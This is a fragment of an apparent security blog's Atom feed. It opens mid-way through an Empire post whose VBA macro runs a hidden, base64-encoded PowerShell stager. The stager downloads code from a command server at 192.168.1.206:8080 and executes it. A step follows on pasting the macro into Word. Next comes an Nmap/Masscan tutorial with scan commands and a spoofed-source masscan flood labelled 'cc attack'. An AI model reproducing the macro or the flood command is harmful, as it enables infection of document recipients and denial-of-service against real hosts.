Debugging() As Variant</span><br><span class="line">Dim Str As String</span><br><span class="line">str = &quot;powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBT&quot;</span><br><span class="line">str = str + &quot;AFkAcwB0AGUAbQAuAE4ARQB0AC4AUwBFAFIAVgBpAGMARQBQAG&quot;</span><br><span class="line">str = str + &quot;8ASQBOAHQATQBBAE4AQQBnAGUAUgBdADoAOgBFAHgAUABFAEMA&quot;</span><br><span class="line">str = str + &quot;VAAxADAAMABDAG8AbgB0AEkATgBVAEUAIAA9ACAAMAA7ACQAVw&quot;</span><br><span class="line">str = str + &quot;BDAD0ATgBFAFcALQBPAGIASgBlAGMAdAAgAFMAWQBzAHQARQBN&quot;</span><br><span class="line">str = str + &quot;AC4ATgBFAFQALgBXAGUAYgBDAGwAaQBlAE4AdAA7ACQAdQA9AC&quot;</span><br><span class="line">str = str + &quot;cATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8A&quot;</span><br><span class="line">str = str + &quot;dwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVA&quot;</span><br><span class="line">str = str + &quot;ByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAw&quot;</span><br><span class="line">str = str + &quot;ACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAE&quot;</span><br><span class="line">str = str + &quot;gARQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEA&quot;</span><br><span class="line">str = str + &quot;ZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBPAFgAeQ&quot;</span><br><span class="line">str = str + &quot;AgAD0AIABbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBXAEUAYgBS&quot;</span><br><span class="line">str = str + &quot;AEUAUQBVAGUAUwB0AF0AOgA6AEQARQBmAEEAdQBMAHQAVwBlAE&quot;</span><br><span class="line">str = str + &quot;IAUAByAE8AeAB5ADsAJAB3AGMALgBQAHIATwB4AHkALgBDAHIA&quot;</span><br><span class="line">str = str + &quot;ZQBkAEUATgB0AEkAYQBsAFMAIAA9ACAAWwBTAHkAUwBUAGUATQ&quot;</span><br><span class="line">str = str + &quot;AuAE4AZQBUAC4AQwBSAGUARABFAE4AVABJAEEATABDAEEAQwBo&quot;</span><br><span class="line">str = str + &quot;AGUAXQA6ADoARABlAEYAYQBVAEwAdABOAGUAdAB3AE8AcgBLAE&quot;</span><br><span class="line">str = str + &quot;MAcgBlAEQAZQBOAFQAaQBhAEwAUwA7ACQASwA9ACcAVABFAGMA&quot;</span><br><span class="line">str = str + &quot;ewBZAEAAXgBMAEkASgB4AFYAZwAxAHAAWgBhADIAVQAzAEYAaQ&quot;</span><br><span class="line">str = str + &quot;BOAEgAXQBgAD8AcgBCAHUAJQAqACcAOwAkAGkAPQAwADsAWwBj&quot;</span><br><span class="line">str = str + &quot;AEgAQQBSAFsAXQBdACQAQgA9ACgAWwBjAEgAQQBSAFsAXQBdAC&quot;</span><br><span class="line">str = str + &quot;gAJAB3AGMALgBEAE8AVwBOAEwAbwBhAGQAUwBUAFIASQBuAGcA&quot;</span><br><span class="line">str = str + &quot;KAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALg&quot;</span><br><span class="line">str = str + &quot;AyADAANgA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAi&quot;</span><br><span class="line">str = str + &quot;ACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABrAFsAJABJAC&quot;</span><br><span class="line">str = str + &quot;sAKwAlACQAawAuAEwARQBOAEcAdABIAF0AfQA7AEkARQBYACAA&quot;</span><br><span class="line">str = str + &quot;KAAkAEIALQBKAE8ASQBuACcAJwApAA==&quot;</span><br><span class="line">Const HIDDEN_WINDOW = 0</span><br><span class="line">strComputer = &quot;.&quot;</span><br><span class="line">Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)</span><br><span class="line">Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">Set objConfig = objStartup.SpawnInstance_</span><br><span class="line">objConfig.ShowWindow = HIDDEN_WINDOW</span><br><span class="line">Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2:Win32_Process&quot;)</span><br><span class="line">objProcess.Create str, Null, objConfig, intProcessID</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure></p><p>打开Word&gt;&gt;视图&gt;&gt;宏&gt;&gt;查看宏&gt;&gt;输入宏名&gt;&gt;创建&gt;&gt;输入macro中内容&gt;&gt;保存</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&amp;gt; python empire&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br
      
    
    </summary>
    
    
      <category term="Empire" scheme="https://blog.safebuff.com/tags/Empire/"/>
    
  </entry>
  
  <entry>
    <title>Port Scanner via Nmap &amp;&amp; Masscan</title>
    <link href="https://blog.safebuff.com/2017/03/09/Port-Scanner-via-Nmap-Masscan/"/>
    <id>https://blog.safebuff.com/2017/03/09/Port-Scanner-via-Nmap-Masscan/</id>
    <published>2017-03-09T10:59:28.000Z</published>
    <updated>2018-10-12T07:36:11.581Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Install-to-Mac"><a href="#Install-to-Mac" class="headerlink" title="Install to Mac"></a>Install to Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install nmap</span><br><span class="line">&gt; brew install masscan</span><br></pre></td></tr></table></figure><h3 id="Nmap-Usage"><a href="#Nmap-Usage" class="headerlink" title="Nmap Usage"></a>Nmap Usage</h3><p><strong>nmap -h</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">Nmap 7.40 ( https://nmap.org )</span><br><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -sL: List Scan - simply list targets to scan</span><br><span class="line">  -sn: Ping Scan - disable port scan</span><br><span class="line">  -Pn: Treat all hosts as online -- skip host discovery</span><br><span class="line">  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports</span><br><span class="line">  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes</span><br><span class="line">  -PO[protocol list]: IP Protocol Ping</span><br><span class="line">  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]</span><br><span class="line">  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers</span><br><span class="line">  --system-dns: Use OS&apos;s DNS resolver</span><br><span class="line">  --traceroute: Trace hop path to each host</span><br><span class="line">SCAN TECHNIQUES:</span><br><span class="line">  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans</span><br><span class="line">  -sU: UDP Scan</span><br><span class="line">  -sN/sF/sX: TCP Null, FIN, and Xmas scans</span><br><span class="line">  --scanflags &lt;flags&gt;: Customize TCP scan flags</span><br><span class="line">  -sI &lt;zombie host[:probeport]&gt;: Idle scan</span><br><span class="line">  -sY/sZ: SCTP INIT/COOKIE-ECHO scans</span><br><span class="line">  -sO: IP protocol scan</span><br><span class="line">  -b &lt;FTP relay host&gt;: FTP bounce scan</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER:</span><br><span class="line">  -p &lt;port ranges&gt;: Only scan specified ports</span><br><span class="line">    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span><br><span class="line">  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning</span><br><span class="line">  -F: Fast mode - Scan fewer ports than the default scan</span><br><span class="line">  -r: Scan ports consecutively - don&apos;t randomize</span><br><span class="line">  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports</span><br><span class="line">  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</span><br><span class="line">SERVICE/VERSION DETECTION:</span><br><span class="line">  -sV: Probe open ports to determine service/version info</span><br><span class="line">  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)</span><br><span class="line">  --version-light: Limit to most likely probes (intensity 2)</span><br><span class="line">  --version-all: Try every single probe (intensity 9)</span><br><span class="line">  --version-trace: Show detailed version scan activity (for debugging)</span><br><span class="line">SCRIPT SCAN:</span><br><span class="line">  -sC: equivalent to --script=default</span><br><span class="line">  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">           directories, script-files or script-categories</span><br><span class="line">  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</span><br><span class="line">  --script-args-file=filename: provide NSE script args in a file</span><br><span class="line">  --script-trace: Show all data sent and received</span><br><span class="line">  --script-updatedb: Update the script database.</span><br><span class="line">  --script-help=&lt;Lua scripts&gt;: Show help about scripts.</span><br><span class="line">           &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">           script-categories.</span><br><span class="line">OS DETECTION:</span><br><span class="line">  -O: Enable OS detection</span><br><span class="line">  --osscan-limit: Limit OS detection to promising targets</span><br><span class="line">  --osscan-guess: Guess OS more aggressively</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  Options which take &lt;time&gt; are in seconds, or append &apos;ms&apos; (milliseconds),</span><br><span class="line">  &apos;s&apos; (seconds), &apos;m&apos; (minutes), or &apos;h&apos; (hours) to the value (e.g. 30m).</span><br><span class="line">  -T&lt;0-5&gt;: Set timing template (higher is faster)</span><br><span class="line">  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes</span><br><span class="line">  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization</span><br><span class="line">  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies</span><br><span class="line">      probe round trip time.</span><br><span class="line">  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.</span><br><span class="line">  --host-timeout &lt;time&gt;: Give up on target after this long</span><br><span class="line">  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes</span><br><span class="line">  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second</span><br><span class="line">  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br><span class="line">FIREWALL/IDS EVASION AND SPOOFING:</span><br><span class="line">  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys</span><br><span class="line">  -S &lt;IP_Address&gt;: Spoof source address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g/--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies</span><br><span class="line">  --data &lt;hex string&gt;: Append a custom payload to sent packets</span><br><span class="line">  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets</span><br><span class="line">  --data-length &lt;num&gt;: Append random data to sent packets</span><br><span class="line">  --ip-options &lt;options&gt;: Send packets with specified ip options</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address</span><br><span class="line">  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;basename&gt;: Output in the three major formats at once</span><br><span class="line">  -v: Increase verbosity level (use -vv or more for greater effect)</span><br><span class="line">  -d: Increase debugging level (use -dd or more for greater effect)</span><br><span class="line">  --reason: Display the reason a port is in a particular state</span><br><span class="line">  --open: Only show open (or possibly open) ports</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (for debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML</span><br><span class="line">  --webxml: Reference stylesheet from Nmap.Org for more portable XML</span><br><span class="line">  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output</span><br><span class="line">MISC:</span><br><span class="line">  -6: Enable IPv6 scanning</span><br><span class="line">  -A: Enable OS detection, version detection, script scanning, and traceroute</span><br><span class="line">  --datadir &lt;dirname&gt;: Specify custom Nmap data file location</span><br><span class="line">  --send-eth/--send-ip: Send using raw ethernet frames or IP packets</span><br><span class="line">  --privileged: Assume that the user is fully privileged</span><br><span class="line">  --unprivileged: Assume the user lacks raw socket privileges</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this help summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  nmap -v -A scanme.nmap.org</span><br><span class="line">  nmap -v -sn 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">  nmap -v -iR 10000 -Pn -p 80</span><br><span class="line">SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES</span><br></pre></td></tr></table></figure><p><strong>NSE Categories</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auth</span><br><span class="line">broadcast</span><br><span class="line">brute</span><br><span class="line">default</span><br><span class="line">discovery</span><br><span class="line">dos</span><br><span class="line">exploit</span><br><span class="line">external</span><br><span class="line">fuzzer</span><br><span class="line">intrusive</span><br><span class="line">malware</span><br><span class="line">safe</span><br><span class="line">version</span><br><span class="line">vuln</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo nmap -sS -Pn -n -v -sn -T5 -iL ips.txt</span><br><span class="line">&gt; sudo nmap -sS -Pn -n -v --open -p 80 -sV -T5 -O --host-timeout=180000 -iL ips.txt</span><br><span class="line">&gt; wget https://raw.githubusercontent.com/maaaaz/nmaptocsv/master/nmaptocsv.py</span><br><span class="line">&gt; python nmaptocsv.py -i test.nmap -f ip-fqdn-port-protocol-service-version-os</span><br><span class="line">or</span><br><span class="line">&gt; python nmaptocsv.py -i test.gnmap -f ip-fqdn-port-protocol-service-version-os</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.2;test.lan;135;tcp;msrpc;Microsoft Windows RPC;Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">192.168.1.2;test.lan;139;tcp;netbios-ssn;;Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">192.168.1.2;test.lan;445;tcp;netbios-ssn;;Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">192.168.1.2;test.lan;5357;tcp;http;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP);Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br></pre></td></tr></table></figure><p><strong>Import Metasploit</strong></p><blockquote><p>msfconsole</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_import test.xml</span><br><span class="line">msf &gt; hosts</span><br></pre></td></tr></table></figure><h3 id="Masscan-Using"><a href="#Masscan-Using" class="headerlink" title="Masscan Using"></a>Masscan Using</h3><p><strong>masscan –nmap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Usage: masscan [Options] -p&#123;Target-Ports&#125; &#123;Target-IP-Ranges&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)</span><br><span class="line">  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">  --randomize-hosts: Randomize order of hosts (default)</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -Pn: Treat all hosts as online (default)</span><br><span class="line">  -n: Never do DNS resolution (default)</span><br><span class="line">SCAN TECHNIQUES:</span><br><span class="line">  -sS: TCP SYN (always on, default)</span><br><span class="line">SERVICE/VERSION DETECTION:</span><br><span class="line">  --banners: get the banners of the listening service if available. The</span><br><span class="line">    default timeout for waiting to recieve data is 30 seconds.</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER:</span><br><span class="line">  -p &lt;port ranges&gt;: Only scan specified ports</span><br><span class="line">    Ex: -p22; -p1-65535; -p 111,137,80,139,8080</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br><span class="line">  --connection-timeout &lt;number&gt;: time in seconds a TCP connection will</span><br><span class="line">    timeout while waiting for banner data from a port.</span><br><span class="line">FIREWALL/IDS EVASION AND SPOOFING:</span><br><span class="line">  -S/--source-ip &lt;IP_Address&gt;: Spoof source address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g/--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address</span><br><span class="line">OUTPUT:</span><br><span class="line">  --output-format &lt;format&gt;: Sets output to binary/list/json/grepable/xml</span><br><span class="line">  --output-file &lt;file&gt;: Write scan results to file. If --output-format is</span><br><span class="line">     not given default is xml</span><br><span class="line">  -oL/-oJ/-oG/-oB/-oX &lt;file&gt;: Output scan in List/JSON/Grepable/Binary/XML format,</span><br><span class="line">     respectively, to the given filename. Shortcut for</span><br><span class="line">     --output-format &lt;format&gt; --output-file &lt;file&gt;</span><br><span class="line">  -v: Increase verbosity level (use -vv or more for greater effect)</span><br><span class="line">  -d: Increase debugging level (use -dd or more for greater effect)</span><br><span class="line">  --open: Only show open (or possibly open) ports</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (for debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">MISC:</span><br><span class="line">  --send-eth: Send using raw ethernet frames (default)</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this help summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80</span><br><span class="line">  masscan 23.0.0.0/0 -p80 --banners -output-format binary --output-filename internet.scan</span><br><span class="line">  masscan --open --banners --readscan internet.scan -oG internet_scan.grepable</span><br><span class="line">SEE (https://github.com/robertdavidgraham/masscan) FOR MORE HELP</span><br></pre></td></tr></table></figure><p><strong>Other Setting</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--wait &lt;int&gt;: wait time</span><br><span class="line">-oR &lt;value&gt;: setting redis connect 127.0.0.1:6379</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11</span><br><span class="line">&gt; masscan 10.1.2.3 -p80 --banners --rate 10000000 --repeat --source-address 192.168.1.0/8 --source-port 0-65535 --output-format null    # cc attack</span><br></pre></td></tr></table></figure><p><strong>Differences in Log Formats</strong></p><table><thead><tr><th></th><th>time</th><th>ip</th><th>port</th><th>state/status</th><th>ip_proto</th><th>reason</th><th>ttl</th><th>proto/service</th><th>owner</th><th>sunrpc</th><th>version</th><th>banner</th><th>cert</th></tr></thead><tbody><tr><td>binary</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>n/a</td><td>n/a</td><td>n/a</td><td>yes</td><td>yes</td></tr><tr><td>xml</td><td>no</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>n/a</td><td>n/a</td><td>n/a</td><td>yes</td><td>yes</td></tr><tr><td>grepable</td><td>no</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>no</td><td>no</td><td>yes</td><td>n/a</td><td>n/a</td><td>n/a</td><td>yes</td><td>yes</td></tr><tr><td>json</td><td>no</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>n/a</td><td>n/a</td><td>n/a</td><td>yes</td><td>yes</td></tr><tr><td>null</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td><td>n/a</td></tr><tr><td>redis</td><td>no</td><td>yes</td><td>yes</td><td>no</td><td>yes</td><td>no</td><td>no</td><td>no</td><td>n/a</td><td>n/a</td><td>n/a</td><td>no</td><td>no</td></tr><tr><td>text</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>no</td><td>no</td><td>yes</td><td>n/a</td><td>n/a</td><td>n/a</td><td>yes</td><td>yes</td></tr><tr><td>unicornscan</td><td>no</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td><td>no</td><td>yes</td><td>no</td><td>n/a</td><td>n/a</td><td>n/a</td><td>no</td><td>no</td></tr></tbody></table><p><strong>Capabilities and samples</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">binary</span><br><span class="line">xml</span><br><span class="line">grepable</span><br><span class="line">json</span><br><span class="line">null</span><br><span class="line">redis</span><br><span class="line">text (a.k.a. &quot;list&quot;)</span><br><span class="line">unicornscan</span><br></pre></td></tr></table></figure></p><p><strong>import to redis</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo masscan -p8899,8088,5566 119.97.243.42 --output-format redis -oR 127.0.0.1:6379</span><br></pre></td></tr></table></figure><blockquote><p>redis-cli</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) &quot;192.168.1.10:8080/tcp&quot;</span><br><span class="line">2) &quot;192.168.1.10:80/tcp&quot;</span><br><span class="line">3) &quot;host&quot;</span><br><span class="line">4) &quot;192.168.1.10&quot;</span><br><span class="line">5) &quot;192.168.1.10:8181/tcp&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Install-to-Mac&quot;&gt;&lt;a href=&quot;#Install-to-Mac&quot; class=&quot;headerlink&quot; title=&quot;Install to Mac&quot;&gt;&lt;/a&gt;Install to Mac&lt;/h3&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
      <category term="Nmap/Masscan" scheme="https://blog.safebuff.com/tags/Nmap-Masscan/"/>
    
  </entry>
  
  <entry>
    <title>Openwrt install Tor Proxy</title>
    <link href="https://blog.safebuff.com/2017/02/26/Openwrt-install-Tor-Proxy/"/>
    <id>https://blog.safebuff.com/2017/02/26/Openwrt-install-Tor-Proxy/</id>
    <published>2017-02-26T10:41:12.000Z</published>
    <updated>2018-10-12T07:36:11.577Z</updated>
    
